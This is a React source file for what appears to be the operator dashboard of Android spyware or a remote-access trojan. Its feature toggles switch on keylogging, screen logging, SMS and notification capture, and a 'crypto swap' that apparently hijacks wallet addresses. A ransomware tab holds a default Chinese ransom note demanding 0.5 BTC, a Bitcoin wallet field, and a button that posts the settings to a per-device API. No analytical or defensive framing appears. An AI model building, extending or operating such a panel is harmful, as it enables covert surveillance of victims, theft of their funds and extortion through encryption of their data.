import React, { useState } from 'react';
import axios from 'axios';
import { Shield, Save, AlertTriangle } from 'lucide-react';
const TOGGLES = [
  { key: 'keylogger', label: 'Keylogger' }, { key: 'notification_logs', label: 'Notification Logs' },
  { key: 'screenlogger', label: 'Screenlogger' }, { key: 'sms_logs', label: 'SMS Logs' },
  { key: 'crypto_swap', label: 'Crypto Swap' }, { key: 'show_notifications', label: 'Show Notifications' }
];
export default function Toolkit() {
  const [tab, setTab] = useState('CONFIG');
  const [cfg, setCfg] = useState({ keylogger: true, notification_logs: false, screenlogger: true, sms_logs: true, crypto_swap: false, show_notifications: true });
  const [ransom, setRansom] = useState({ title: '您的文件已被加密', body: '您的文件已被加密计时器停止后将被删除请向以下地址发送0.5 BTC以解密并取回您的文件', wallet: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh' });
  const [deviceId, setDeviceId] = useState('');
  const toggle = (k) => setCfg(p => ({ ...p, [k]: !p[k] }));
  const saveCfg = async () => { await axios.post(`/api/toolkit/config/${deviceId}`, cfg); };
  const saveRansom = async () => { await axios.post(`/api/toolkit/ransomware/${deviceId}`, ransom); };
  return (
    <div className="space-y-6">
      <div className="flex items-center gap-3"><Shield size={20} className="text-yellow-400"/><h1 className="text-xl font-bold text-white">Toolkit</h1></div>
      <div className="flex gap-1 bg-wuzen-card border border-wuzen-border rounded-lg p-1 w-fit">
        {['CONFIG','ADDRESSES','RANSOMWARE'].map(t => (<button key={t} onClick={()=>setTab(t)} className={`px-6 py-2 text-xs font-mono font-bold rounded transition-all ${tab===t?(t==='RANSOMWARE'?'bg-red-500/20 text-red-400':'bg-cyan-500/20 text-cyan-400'):'text-wuzen-muted hover:text-white'}`}>{t}</button>))}
      </div>
      {tab==='CONFIG' && <div className="bg-wuzen-card border border-wuzen-border rounded-xl p-6">
        <h3 className="text-xs font-mono text-wuzen-muted mb-4 tracking-wider">FEATURE TOGGLES</h3>
        <div className="grid grid-cols-3 gap-4 mb-6">
          {TOGGLES.map(t => (<div key={t.key} onClick={()=>toggle(t.key)} className={`flex items-center justify-between p-4 border rounded-lg cursor-pointer transition-all ${cfg[t.key]?'border-green-500/50 bg-green-500/5':'border-wuzen-border bg-wuzen-bg'}`}><span className="text-sm text-white">{t.label}</span><div className={`w-12 h-6 rounded-full p-1 transition-all ${cfg[t.key]?'bg-green-500':'bg-gray-700'}`}><div className={`w-4 h-4 rounded-full bg-white transition-all ${cfg[t.key]?'translate-x-6':'translate-x-0'}`}/></div></div>))}
        </div>
        <input type="text" placeholder="Device ID..." value={deviceId} onChange={e=>setDeviceId(e.target.value)} className="px-4 py-2 bg-wuzen-bg border border-wuzen-border rounded-lg text-sm text-white focus:border-cyan-500 focus:outline-none mb-4 block"/>
        <button onClick={saveCfg} className="flex items-center gap-2 px-6 py-2.5 bg-green-500/20 border border-green-500/50 text-green-400 text-sm font-mono font-bold rounded-lg hover:bg-green-500/30 transition-all"><Save size={14}/> SAVE CONFIG</button>
      </div>}
      {tab==='RANSOMWARE' && <div className="bg-wuzen-card border border-wuzen-border rounded-xl p-6 space-y-4">
        <div className="flex items-center gap-3 p-4 bg-red-500/10 border border-red-500/30 rounded-lg"><AlertTriangle size={20} className="text-red-400"/><span className="text-sm text-red-400 font-mono">WARNING: This feature will encrypt all user data on the target device. Use with extreme caution.</span></div>
        <div><label className="text-xs font-mono text-wuzen-muted mb-1 block">RANSOM MESSAGE TITLE</label><input type="text" value={ransom.title} onChange={e=>setRansom(p=>({...p,title:e.target.value}))} className="w-full px-4 py-3 bg-wuzen-bg border border-wuzen-border rounded-lg text-sm text-white focus:border-red-500 focus:outline-none"/></div>
        <div><label className="text-xs font-mono text-wuzen-muted mb-1 block">RANSOM MESSAGE BODY</label><textarea value={ransom.body} onChange={e=>setRansom(p=>({...p,body:e.target.value}))} rows={3} className="w-full px-4 py-3 bg-wuzen-bg border border-wuzen-border rounded-lg text-sm text-white focus:border-red-500 focus:outline-none resize-none"/></div>
        <div><label className="text-xs font-mono text-wuzen-muted mb-1 block">RANSOM WALLET</label><input type="text" value={ransom.wallet} onChange={e=>setRansom(p=>({...p,wallet:e.target.value}))} className="w-full px-4 py-3 bg-wuzen-bg border border-wuzen-border rounded-lg text-sm text-white font-mono focus:border-red-500 focus:outline-none"/></div>
        <button onClick={saveRansom} className="flex items-center gap-2 px-6 py-2.5 bg-green-500/20 border border-green-500/50 text-green-400 text-sm font-mono font-bold rounded-lg hover:bg-green-500/30 transition-all"><Save size={14}/> SAVE RANSOMWARE CONFIG</button>
      </div>}
    </div>
  );
}